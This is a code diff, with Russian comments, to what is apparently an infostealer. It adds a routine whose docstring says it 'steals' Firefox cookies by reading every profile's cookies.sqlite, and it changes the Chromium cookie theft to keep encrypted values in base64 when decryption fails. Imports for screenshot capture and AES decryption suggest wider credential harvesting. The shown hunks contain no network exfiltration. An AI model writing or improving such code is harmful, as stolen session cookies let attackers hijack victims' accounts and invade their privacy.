@@ -12,13 +12,15 @@ import time
 from datetime import datetime
 from urllib.request import urlopen
 from PIL import ImageGrab
-import browser_cookie3
 import shutil
 import base64
 import re
 import cv2
 import sys
 from pathlib import Path
+from Cryptodome.Cipher import AES
+import sqlite3
+import base64
 from Cryptodome.Cipher import AES
 
 # Исправленный импорт для Windows-специфичных модулей
@@ -64,6 +66,85 @@ BROWSERS = {
     "edge": "Microsoft Edge"
 }
 
+# =============================================
+# ФУНКЦИИ ДЛЯ РАБОТЫ С FIREFOX COOKIES (ДОБАВЛЕНЫ)
+# =============================================
+
+def get_firefox_profiles():
+    """Получает список профилей Firefox"""
+    profiles = []
+    appdata = os.getenv('APPDATA')
+    if not appdata:
+        return profiles
+    firefox_path = Path(appdata) / 'Mozilla' / 'Firefox' / 'Profiles'
+    if not firefox_path.exists():
+        return profiles
+    for item in os.listdir(str(firefox_path)):
+        full_path = firefox_path / item
+        if full_path.is_dir():
+            profiles.append(str(full_path))
+    return profiles
+
+def get_firefox_cookies():
+    """Крадет куки из Firefox с обработкой зашифрованных значений"""
+    profiles = get_firefox_profiles()
+    all_cookies = []
+    
+    for profile in profiles:
+        if not profile or not isinstance(profile, str):
+            continue
+            
+        db_path = Path(profile) / 'cookies.sqlite'
+        if not db_path.exists():
+            continue
+            
+        try:
+            conn = sqlite3.connect(str(db_path))
+            cursor = conn.cursor()
+            cursor.execute("""
+                SELECT host, name, value, path, expiry, isSecure, isHttpOnly, sameSite
+                FROM moz_cookies
+            """)
+            
+            for row in cursor:
+                try:
+                    host, name, value, path, expiry, is_secure, is_http_only, same_site = row
+                    
+                    # Обработка значений
+                    host = host if isinstance(host, str) else host.decode('utf-8', errors='ignore')
+                    name = name if isinstance(name, str) else name.decode('utf-8', errors='ignore')
+                    path = path if isinstance(path, str) else path.decode('utf-8', errors='ignore')
+                    
+                    # Если значение - бинарные данные, конвертируем в base64
+                    if isinstance(value, bytes):
+                        value_str = base64.b64encode(value).decode('utf-8')
+                    else:
+                        value_str = str(value)
+                        
+                    all_cookies.append({
+                        'host': host,
+                        'name': name,
+                        'value': value_str,
+                        'path': path,
+                        'expires': expiry,
+                        'secure': bool(is_secure),
+                        'http_only': bool(is_http_only),
+                        'same_site': same_site
+                    })
+                except Exception as e:
+                    print(f"Ошибка обработки куки Firefox: {e}")
+                    continue
+                    
+        except Exception as e:
+            print(f"Ошибка доступа к базе куки Firefox: {e}")
+        finally:
+            conn.close()
+            
+    return all_cookies
+
+# =============================================
+# ОСНОВНОЙ КОД (С ИНТЕГРИРОВАННЫМИ ИЗМЕНЕНИЯМИ)
+# =============================================
 
 def create_directories():
     """Гарантированно создает все необходимые директории"""
@@ -455,7 +536,8 @@ def steal_chromium_cookies(browser_name, profile_path):
                     if decrypted_value:
                         cookie_value = decrypted_value
                     else:
-                        cookie_value = value if value else ""
+                        # Если расшифровка не удалась, сохраняем зашифрованное значение в Base64
+                        cookie_value = base64.b64encode(encrypted_value).decode('utf-8')
                 else:
                     cookie_value = value if value else ""
                 
@@ -558,35 +640,13 @@ def steal_cookies():
                 cookies = []
                 
                 if browser_name == "firefox":
-                    # Для Firefox используем browser_cookie3 с улучшенной обработкой
+                    print(f"Обработка браузера: {display_name}")
                     try:
-                        # Указываем явный путь к профилю Firefox
-                        firefox_profile = Path(os.getenv("APPDATA")) / "Mozilla" / "Firefox" / "Profiles"
-                        cookie_path = None
-                        
-                        if firefox_profile.exists():
-                            # Ищем первый профиль
-                            for profile_dir in firefox_profile.iterdir():
-                                if profile_dir.is_dir() and "default" in profile_dir.name.lower():
-                                    cookie_path = profile_dir / "cookies.sqlite"
-                                    if cookie_path.exists():
-                                        break
-                            
-                        if cookie_path and cookie_path.exists():
-                            jar = browser_cookie3.firefox(cookie_file=str(cookie_path))
+                        cookies = get_firefox_cookies()
+                        if cookies:
+                            print(f"Куки Firefox успешно получены: {len(cookies)} записей")
                         else:
-                            jar = browser_cookie3.firefox()
-                            
-                        for cookie in jar:
-                            cookies.append({
-                                'host': cookie.domain,
-                                'name': cookie.name,
-                                'value': cookie.value,
-                                'path': cookie.path,
-                                'expires': cookie.expires,
-                                'secure': cookie.secure
-                            })
-                        print(f"Куки Firefox успешно получены: {len(cookies)} записей")
+                            print(f"Для браузера Mozilla Firefox куки не найдены")
                     except Exception as e:
                         print(f"Не удалось получить куки для Firefox: {e}")
                 elif browser_name in browser_paths:
